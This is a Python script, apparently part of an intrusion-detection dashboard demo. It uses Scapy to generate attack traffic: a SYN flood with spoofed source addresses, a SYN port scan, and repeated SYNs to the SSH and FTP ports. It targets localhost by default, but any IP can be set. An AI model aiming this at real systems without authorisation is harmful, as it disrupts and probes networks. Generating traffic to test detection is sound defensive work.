#!/usr/bin/env python3
"""
Attack Packet Sender for Demo Purposes
Sends crafted packets via Scapy so the dashboard can detect them in real-time.

Usage (requires sudo for raw sockets):
    sudo python scripts/send_attacks.py --attack ddos --target 127.0.0.1 --duration 30
    sudo python scripts/send_attacks.py --attack portscan --target 127.0.0.1
    sudo python scripts/send_attacks.py --attack ssh --target 127.0.0.1 --duration 20
    sudo python scripts/send_attacks.py --attack ftp --target 127.0.0.1 --duration 20
    sudo python scripts/send_attacks.py   # interactive menu
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send, RandShort, conf
except ImportError:
    print("ERROR: Scapy is required.  Install with:  pip install scapy")
    sys.exit(1)


# Suppress Scapy warnings
conf.verb = 0


def ddos_syn_flood(target: str, port: int = 80, duration: int = 30):
    """Rapid SYN packets from random source IPs (classic DDoS)."""
    print(f"\n[DDoS SYN Flood] Target={target}:{port}  Duration={duration}s")
    sent = 0
    end = time.time() + duration
    while time.time() < end:
        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=target) / TCP(sport=RandShort(), dport=port, flags="S")
        send(pkt, verbose=0)
        sent += 1
        if sent % 50 == 0:
            elapsed = duration - (end - time.time())
            print(f"  Sent {sent} packets  ({sent/max(elapsed,0.1):.0f} pkt/s)", end="\r")
        time.sleep(0.01)
    print(f"\n  Done. Total packets sent: {sent}")


def port_scan(target: str, start_port: int = 1, end_port: int = 1024, duration: int = 30):
    """SYN scan across sequential ports."""
    print(f"\n[Port Scan] Target={target}  Ports={start_port}-{end_port}  Duration={duration}s")
    sent = 0
    deadline = time.time() + duration
    port = start_port
    while time.time() < deadline and port <= end_port:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        send(pkt, verbose=0)
        sent += 1
        port += 1
        if port > end_port:
            port = start_port
        if sent % 20 == 0:
            print(f"  Sent {sent} probes  (current port: {port})", end="\r")
        time.sleep(0.02)
    print(f"\n  Done. Total probes sent: {sent}")


def ssh_brute_force(target: str, duration: int = 30):
    """Repeated TCP SYN to port 22 (SSH brute-force pattern)."""
    print(f"\n[SSH Brute Force] Target={target}:22  Duration={duration}s")
    sent = 0
    end = time.time() + duration
    while time.time() < end:
        src_ip = f"192.168.1.{random.randint(100,200)}"
        pkt = IP(src=src_ip, dst=target) / TCP(sport=RandShort(), dport=22, flags="S")
        send(pkt, verbose=0)
        sent += 1
        if sent % 20 == 0:
            print(f"  Sent {sent} connection attempts", end="\r")
        time.sleep(0.05)
    print(f"\n  Done. Total attempts: {sent}")


def ftp_brute_force(target: str, duration: int = 30):
    """Repeated TCP SYN to port 21 (FTP brute-force pattern)."""
    print(f"\n[FTP Brute Force] Target={target}:21  Duration={duration}s")
    sent = 0
    end = time.time() + duration
    while time.time() < end:
        src_ip = f"10.0.0.{random.randint(50,150)}"
        pkt = IP(src=src_ip, dst=target) / TCP(sport=RandShort(), dport=21, flags="S")
        send(pkt, verbose=0)
        sent += 1
        if sent % 20 == 0:
            print(f"  Sent {sent} connection attempts", end="\r")
        time.sleep(0.05)
    print(f"\n  Done. Total attempts: {sent}")


ATTACKS = {
    'ddos':     ('DDoS SYN Flood',     ddos_syn_flood),
    'portscan': ('Port Scan',           port_scan),
    'ssh':      ('SSH Brute Force',     ssh_brute_force),
    'ftp':      ('FTP Brute Force',     ftp_brute_force),
}


def interactive_menu(target: str, duration: int):
    """Show interactive menu for attack selection."""
    print("\n╔══════════════════════════════════════════╗")
    print("║   Network Attack Simulator (for demo)    ║")
    print("╚══════════════════════════════════════════╝\n")
    print(f"  Target: {target}    Duration: {duration}s\n")
    for i, (key, (name, _)) in enumerate(ATTACKS.items(), 1):
        print(f"  [{i}] {name:<25} (--attack {key})")
    print(f"  [0] Exit\n")

    while True:
        choice = input("Select attack type [1-4]: ").strip()
        if choice == '0':
            print("Exiting.")
            return
        keys = list(ATTACKS.keys())
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(keys):
                name, func = ATTACKS[keys[idx]]
                print(f"\nLaunching: {name}")
                func(target, duration=duration)
                print("\nAttack complete. Select another or [0] to exit.\n")
            else:
                print("Invalid selection.")
        except (ValueError, IndexError):
            print("Invalid input. Enter a number 1-4 or 0 to exit.")


def main():
    parser = argparse.ArgumentParser(description="Send crafted attack packets for demo")
    parser.add_argument('--attack', choices=list(ATTACKS.keys()),
                        help='Attack type (omit for interactive menu)')
    parser.add_argument('--target', default='127.0.0.1',
                        help='Target IP address (default: 127.0.0.1)')
    parser.add_argument('--duration', type=int, default=30,
                        help='Attack duration in seconds (default: 30)')
    parser.add_argument('--port', type=int, default=80,
                        help='Target port for DDoS (default: 80)')
    parser.add_argument('--all', action='store_true',
                        help='Run all 4 attacks sequentially')
    args = parser.parse_args()

    if args.all:
        print("\n[ALL ATTACKS] Running all 4 attacks sequentially")
        print(f"  Target: {args.target}  Duration: {args.duration}s each\n")
        for key, (name, func) in ATTACKS.items():
            print(f"{'='*50}")
            if key == 'ddos':
                func(args.target, port=args.port, duration=args.duration)
            else:
                func(args.target, duration=args.duration)
            print(f"  Pausing 5s before next attack...\n")
            time.sleep(5)
        print(f"{'='*50}")
        print("All attacks complete.")
    elif args.attack:
        name, func = ATTACKS[args.attack]
        print(f"Launching: {name}")
        if args.attack == 'ddos':
            func(args.target, port=args.port, duration=args.duration)
        else:
            func(args.target, duration=args.duration)
    else:
        interactive_menu(args.target, args.duration)


if __name__ == '__main__':
    main()
